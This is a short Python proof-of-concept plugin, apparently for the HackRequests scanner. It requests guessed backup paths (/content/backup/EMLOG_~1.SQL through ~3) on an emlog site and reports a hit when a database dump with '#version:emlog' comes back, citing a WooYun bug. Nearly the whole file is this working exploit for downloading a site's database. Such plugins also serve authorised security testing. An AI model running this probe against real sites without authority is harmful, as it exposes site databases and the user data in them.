# Author:w8ay
# Name:测试DEMO
#__Author__ = 01001000entai
#_PlugName_ = emlog database
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-099976

import HackRequests


def poc(arg, **kwargs):
    hack = HackRequests.hackRequests()
    for i in range(1,4):
        payload = '/content/backup/EMLOG_~{}.SQL'.format(i)
        target = arg + payload
        hh = hack.http(target)
        if hh.status_code == 200 and '#version:emlog' in hh.text():
            result = {
                "name": "emlog 数据库下载",  # 插件名称
                "content": "存在短文件漏洞，可能导致数据库被下载",  # 插件返回内容详情，会造成什么后果。
                "url": target,  # 漏洞存在url
                "log": hh.log,
                "tag": "info_leak"  # 漏洞标签
            }
            return result


if __name__ == "__main__":
    pass